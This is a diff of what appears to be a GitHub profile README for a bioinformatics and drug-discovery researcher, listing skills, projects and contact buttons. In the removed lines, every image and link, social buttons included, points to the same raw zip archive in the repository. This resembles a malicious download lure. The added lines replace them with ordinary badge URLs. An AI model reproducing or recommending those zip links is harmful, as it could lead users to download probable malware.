@@ -1,14 +1,14 @@
 
 <div align="center">
   <img
-    src="https://github.com/HazratMaghaz/HazratMaghaz/raw/refs/heads/main/scenarioize/Hazrat_Maghaz_brachigerous.zip%20Maghaz&desc=Bioinformatics%20Researcher%20%7C%20AI%20for%20Drug%20Discovery&fontSize=64&fontAlign=50&fontAlignY=38&descAlign=50&descAlignY=72&fontColor=0d1117&stroke=0d1117&strokeWidth=2"
+    src="https://capsule-render.vercel.app/api?type=waving&color=gradient&customColorList=6,11,20&height=200&section=header&text=Hazrat%20Maghaz&desc=Bioinformatics%20Researcher%20%7C%20AI%20for%20Drug%20Discovery&fontSize=64&fontAlign=50&fontAlignY=38&descAlign=50&descAlignY=72&fontColor=FFFFFF&stroke=FFFFFF&strokeWidth=2"
     alt="Header"
     style="width:100%; max-width:100%; display:block; margin:0; padding:0;"
   />
 
-  <a href="https://github.com/HazratMaghaz/HazratMaghaz/raw/refs/heads/main/scenarioize/Hazrat_Maghaz_brachigerous.zip">
+  <a href="#">
     <img
-      src="https://github.com/HazratMaghaz/HazratMaghaz/raw/refs/heads/main/scenarioize/Hazrat_Maghaz_brachigerous.zip+Code&size=24&duration=2500&pause=800&color=0D1117&center=true&vCenter=true&width=750&lines=MS+Bioinformatics+%40+NUST;Bridging+Biology%2C+AI%2C+and+Technology;Founder+of+InnoHelix+%26+Omics+Nexus;Expert+in+NGS%2C+QSAR%2C+Docking+%26+Web+Dev"
+      src="https://readme-typing-svg.demolab.com?font=Fira+Code&size=24&duration=2500&pause=800&color=0D1117&center=true&vCenter=true&width=750&lines=MS+Bioinformatics+%40+NUST;Bridging+Biology%2C+AI%2C+and+Technology;Founder+of+InnoHelix+%26+Omics+Nexus;Expert+in+NGS%2C+QSAR%2C+Docking+%26+Web+Dev"
       alt="Typing SVG"
       style="margin-top:10px;"
     />
@@ -20,29 +20,29 @@
 
 <div align="center">
   <img
-    src="https://github.com/HazratMaghaz/HazratMaghaz/raw/refs/heads/main/scenarioize/Hazrat_Maghaz_brachigerous.zip+Code&size=24&duration=2500&pause=800&color=33FFCC&center=true&vCenter=true&width=820&lines=MSc+Bioinformatics+%40+NUST;Bridging+Biology%2C+AI%2C+and+Technology;Founder+of+InnoHelix+%26+Omics+Nexus;NGS%2C+QSAR%2C+Docking+%26+Web+Dev"
+    src="https://readme-typing-svg.demolab.com?font=Fira+Code&size=24&duration=2500&pause=800&color=33FFCC&center=true&vCenter=true&width=820&lines=MSc+Bioinformatics+%40+NUST;Bridging+Biology%2C+AI%2C+and+Technology;Founder+of+InnoHelix+%26+Omics+Nexus;NGS%2C+QSAR%2C+Docking+%26+Web+Dev"
     alt="Typing SVG"
   />
 </div>
 
 <br/>
 
-<!-- Buttons (ONLY the ones you asked) -->
+<!-- Social Buttons -->
 <div align="center">
-  <a href="https://github.com/HazratMaghaz/HazratMaghaz/raw/refs/heads/main/scenarioize/Hazrat_Maghaz_brachigerous.zip">
-    <img src="https://github.com/HazratMaghaz/HazratMaghaz/raw/refs/heads/main/scenarioize/Hazrat_Maghaz_brachigerous.zip" alt="Website" />
+  <a href="#">
+    <img src="https://img.shields.io/badge/Website-4285F4?style=for-the-badge&logo=google-chrome&logoColor=white" alt="Website" />
   </a>
-  <a href="https://github.com/HazratMaghaz/HazratMaghaz/raw/refs/heads/main/scenarioize/Hazrat_Maghaz_brachigerous.zip">
-    <img src="https://github.com/HazratMaghaz/HazratMaghaz/raw/refs/heads/main/scenarioize/Hazrat_Maghaz_brachigerous.zip" alt="LinkedIn" />
+  <a href="https://linkedin.com/in/hazratmaghaz">
+    <img src="https://img.shields.io/badge/LinkedIn-0077B5?style=for-the-badge&logo=linkedin&logoColor=white" alt="LinkedIn" />
   </a>
-  <a href="https://github.com/HazratMaghaz/HazratMaghaz/raw/refs/heads/main/scenarioize/Hazrat_Maghaz_brachigerous.zip">
-    <img src="https://github.com/HazratMaghaz/HazratMaghaz/raw/refs/heads/main/scenarioize/Hazrat_Maghaz_brachigerous.zip" alt="Email" />
+  <a href="mailto:your@email.com">
+    <img src="https://img.shields.io/badge/Email-D14836?style=for-the-badge&logo=gmail&logoColor=white" alt="Email" />
   </a>
-  <a href="https://github.com/HazratMaghaz/HazratMaghaz/raw/refs/heads/main/scenarioize/Hazrat_Maghaz_brachigerous.zip">
-    <img src="https://github.com/HazratMaghaz/HazratMaghaz/raw/refs/heads/main/scenarioize/Hazrat_Maghaz_brachigerous.zip" alt="Fiverr" />
+  <a href="#">
+    <img src="https://img.shields.io/badge/Fiverr-1DBF73?style=for-the-badge&logo=fiverr&logoColor=white" alt="Fiverr" />
   </a>
-  <a href="https://github.com/HazratMaghaz/HazratMaghaz/raw/refs/heads/main/scenarioize/Hazrat_Maghaz_brachigerous.zip">
-    <img src="https://github.com/HazratMaghaz/HazratMaghaz/raw/refs/heads/main/scenarioize/Hazrat_Maghaz_brachigerous.zip" alt="Facebook" />
+  <a href="#">
+    <img src="https://img.shields.io/badge/Facebook-1877F2?style=for-the-badge&logo=facebook&logoColor=white" alt="Facebook" />
   </a>
 </div>
 
@@ -66,25 +66,25 @@ I am also an entrepreneur, building **InnoHelix** (Research Tooling) and **Omics
 | **🧬 Genomics & NGS** | RNA-seq analysis, Differential Expression (DEG), Pathway Enrichment, and building reproducible pipelines. |
 | **💊 Drug Discovery** | **QSAR/ADMET** modeling, Molecular Docking, MD Simulations, and Pharmacophore modeling. |
 | **🤖 ML for Biology** | Building robust AI models (no data leakage!) using **SHAP** for explainability and Deep Learning for signal processing. |
-| **💻 Research Tools** | I don't just write scripts; I build **Full-Stack Web Apps** (https://github.com/HazratMaghaz/HazratMaghaz/raw/refs/heads/main/scenarioize/Hazrat_Maghaz_brachigerous.zip, Python) to visualize and deploy models. |
+| **💻 Research Tools** | I don't just write scripts; I build **Full-Stack Web Apps** (Next.js, FastAPI, Python) to visualize and deploy models. |
 
 ---
 
 ## 🛠️ Technical Stack
 
 <div align="center">
-  <img src="https://github.com/HazratMaghaz/HazratMaghaz/raw/refs/heads/main/scenarioize/Hazrat_Maghaz_brachigerous.zip,r,linux,bash,git,github,docker,fastapi,react,nextjs,tailwind,pytorch,tensorflow,sklearn,postgres&perline=8" alt="Tech Stack" />
+  <img src="https://skillicons.dev/icons?i=python,r,linux,bash,git,github,docker,fastapi,react,nextjs,tailwind,pytorch,tensorflow,sklearn,postgres&perline=8" alt="Tech Stack" />
 </div>
 
 <br/>
 
 <div align="center">
-  <img src="https://github.com/HazratMaghaz/HazratMaghaz/raw/refs/heads/main/scenarioize/Hazrat_Maghaz_brachigerous.zip" alt="AutoDock Vina" />
-  <img src="https://github.com/HazratMaghaz/HazratMaghaz/raw/refs/heads/main/scenarioize/Hazrat_Maghaz_brachigerous.zip" alt="GROMACS" />
-  <img src="https://github.com/HazratMaghaz/HazratMaghaz/raw/refs/heads/main/scenarioize/Hazrat_Maghaz_brachigerous.zip" alt="PyMOL" />
-  <img src="https://github.com/HazratMaghaz/HazratMaghaz/raw/refs/heads/main/scenarioize/Hazrat_Maghaz_brachigerous.zip" alt="Biopython" />
-  <img src="https://github.com/HazratMaghaz/HazratMaghaz/raw/refs/heads/main/scenarioize/Hazrat_Maghaz_brachigerous.zip" alt="Deseq2" />
-  <img src="https://github.com/HazratMaghaz/HazratMaghaz/raw/refs/heads/main/scenarioize/Hazrat_Maghaz_brachigerous.zip" alt="GRIND2" />
+  <img src="https://img.shields.io/badge/AutoDock_Vina-FF6B35?style=for-the-badge" alt="AutoDock Vina" />
+  <img src="https://img.shields.io/badge/GROMACS-8B0000?style=for-the-badge" alt="GROMACS" />
+  <img src="https://img.shields.io/badge/PyMOL-4B0082?style=for-the-badge" alt="PyMOL" />
+  <img src="https://img.shields.io/badge/Biopython-1ABC9C?style=for-the-badge&logo=python&logoColor=white" alt="Biopython" />
+  <img src="https://img.shields.io/badge/DESeq2-2196F3?style=for-the-badge" alt="Deseq2" />
+  <img src="https://img.shields.io/badge/GRIND2-00897B?style=for-the-badge" alt="GRIND2" />
 </div>
 
 ---
@@ -93,10 +93,10 @@ I am also an entrepreneur, building **InnoHelix** (Research Tooling) and **Omics
 
 | Project | Tech Stack | Description |
 | :--- | :--- | :--- |
-| **🧠 Brain Cancer CNN** | ![TensorFlow](https://github.com/HazratMaghaz/HazratMaghaz/raw/refs/heads/main/scenarioize/Hazrat_Maghaz_brachigerous.zip) ![Python](https://github.com/HazratMaghaz/HazratMaghaz/raw/refs/heads/main/scenarioize/Hazrat_Maghaz_brachigerous.zip) | **Medical Imaging AI:** A deep learning model for brain tumor detection and classification with robust validation metrics to aid early diagnosis. |
-| **⚗️ QSAR with SHAP** | ![Scikit-Learn](https://github.com/HazratMaghaz/HazratMaghaz/raw/refs/heads/main/scenarioize/Hazrat_Maghaz_brachigerous.zip) ![XAI](https://github.com/HazratMaghaz/HazratMaghaz/raw/refs/heads/main/scenarioize/Hazrat_Maghaz_brachigerous.zip) | **Drug Discovery AI:** A predictive model for drug activity utilizing **SHAP** (Explainable AI) to interpret exactly *why* a molecule is active. |
-| **🧬 RNA Structure Pred** | ![Bioinformatics](https://github.com/HazratMaghaz/HazratMaghaz/raw/refs/heads/main/scenarioize/Hazrat_Maghaz_brachigerous.zip) ![Algorithms](https://github.com/HazratMaghaz/HazratMaghaz/raw/refs/heads/main/scenarioize/Hazrat_Maghaz_brachigerous.zip) | **Genomics Tooling:** Implemented secondary structure analysis and visualization algorithms for RNA aptamers to predict folding patterns. |
-| **👁️ Face Detection** | ![OpenCV](https://github.com/HazratMaghaz/HazratMaghaz/raw/refs/heads/main/scenarioize/Hazrat_Maghaz_brachigerous.zip) ![CV](https://github.com/HazratMaghaz/HazratMaghaz/raw/refs/heads/main/scenarioize/Hazrat_Maghaz_brachigerous.zip) | **Real-Time CV:** A high-accuracy face detection system capable of identifying individuals in live video streams. |
+| **🧠 Brain Cancer CNN** | ![TensorFlow](https://img.shields.io/badge/TensorFlow-FF6F00?style=flat-square&logo=tensorflow&logoColor=white) ![Python](https://img.shields.io/badge/Python-3776AB?style=flat-square&logo=python&logoColor=white) | **Medical Imaging AI:** A deep learning model for brain tumor detection and classification with robust validation metrics to aid early diagnosis. |
+| **⚗️ QSAR with SHAP** | ![Scikit-Learn](https://img.shields.io/badge/Scikit--Learn-F7931E?style=flat-square&logo=scikitlearn&logoColor=white) ![XAI](https://img.shields.io/badge/XAI%2FSHAP-9C27B0?style=flat-square) | **Drug Discovery AI:** A predictive model for drug activity utilizing **SHAP** (Explainable AI) to interpret exactly *why* a molecule is active. |
+| **🧬 RNA Structure Pred** | ![Bioinformatics](https://img.shields.io/badge/Bioinformatics-1976D2?style=flat-square) ![Algorithms](https://img.shields.io/badge/Algorithms-4CAF50?style=flat-square) | **Genomics Tooling:** Implemented secondary structure analysis and visualization algorithms for RNA aptamers to predict folding patterns. |
+| **👁️ Face Detection** | ![OpenCV](https://img.shields.io/badge/OpenCV-5C3EE8?style=flat-square&logo=opencv&logoColor=white) ![CV](https://img.shields.io/badge/Computer%20Vision-FF4081?style=flat-square) | **Real-Time CV:** A high-accuracy face detection system capable of identifying individuals in live video streams. |
 
 ---
 
@@ -104,12 +104,12 @@ I am also an entrepreneur, building **InnoHelix** (Research Tooling) and **Omics
 
 <div align="center">
   <img
-    src="https://github.com/HazratMaghaz/HazratMaghaz/raw/refs/heads/main/scenarioize/Hazrat_Maghaz_brachigerous.zip;theme=tokyonight"
+    src="https://github-readme-stats.vercel.app/api?username=HazratMaghaz&show_icons=true&theme=tokyonight&hide_border=true"
     alt="GitHub Stats"
     height="165"
   />
   <img
-    src="https://github.com/HazratMaghaz/HazratMaghaz/raw/refs/heads/main/scenarioize/Hazrat_Maghaz_brachigerous.zip;theme=tokyonight&amp;utcOffset=5"
+    src="https://github-profile-summary-cards.vercel.app/api/cards/productive-time?username=HazratMaghaz&theme=tokyonight&utcOffset=5"
     alt="Productive Time"
     height="165"
   />
@@ -119,12 +119,12 @@ I am also an entrepreneur, building **InnoHelix** (Research Tooling) and **Omics
 
 <div align="center">
   <img
-    src="https://github.com/HazratMaghaz/HazratMaghaz/raw/refs/heads/main/scenarioize/Hazrat_Maghaz_brachigerous.zip;theme=tokyonight"
+    src="https://github-readme-stats.vercel.app/api/top-langs/?username=HazratMaghaz&layout=compact&theme=tokyonight&hide_border=true"
     alt="Top Languages"
     height="165"
   />
   <img
-    src="https://github.com/HazratMaghaz/HazratMaghaz/raw/refs/heads/main/scenarioize/Hazrat_Maghaz_brachigerous.zip;theme=tokyonight"
+    src="https://github-profile-summary-cards.vercel.app/api/cards/repos-per-language?username=HazratMaghaz&theme=tokyonight"
     alt="Repos per Language"
     height="165"
   />
@@ -136,8 +136,8 @@ I am also an entrepreneur, building **InnoHelix** (Research Tooling) and **Omics
   <h2>🤝 Let's Collaborate!</h2>
   <p>I am open to <b>Research Collaborations</b>, <b>Freelance Bioinformatics Projects</b>, and building <b>Custom Research Dashboards</b>.</p>
 
-  <a href="https://github.com/HazratMaghaz/HazratMaghaz/raw/refs/heads/main/scenarioize/Hazrat_Maghaz_brachigerous.zip">
-    <img src="https://github.com/HazratMaghaz/HazratMaghaz/raw/refs/heads/main/scenarioize/Hazrat_Maghaz_brachigerous.zip" alt="Hire Me" />
+  <a href="#">
+    <img src="https://img.shields.io/badge/Hire%20Me%20on%20Fiverr-1DBF73?style=for-the-badge&logo=fiverr&logoColor=white" alt="Hire Me" />
   </a>
 
   <br/><br/>
